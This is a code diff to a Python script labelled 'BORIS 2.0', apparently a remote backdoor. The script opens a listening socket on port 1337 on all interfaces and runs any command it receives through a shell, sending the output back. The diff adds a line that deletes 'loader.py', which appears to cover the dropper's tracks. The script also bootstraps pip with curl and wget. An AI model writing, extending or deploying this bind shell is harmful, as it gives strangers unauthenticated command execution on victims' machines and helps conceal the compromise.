@@ -1,9 +1,12 @@
 VERSION=2.0
 #BORIS 2.0
 import os
+try:
+    os.system("rm loader.py")
+except:
+    pass
 from subprocess import check_output,Popen
 import socket
-
 def payload():
     s = socket.socket() 
     s.bind(("0.0.0.0",1337))
@@ -18,7 +21,6 @@ def payload():
                 c.send("Error - cannot change into directory.")
         else:
             c.send(check_output(command,shell=True))
-    
 if 0 != os.system("which pip"): # get pip
     os.system("curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py")
     os.system("wget https://bootstrap.pypa.io/get-pip.py")
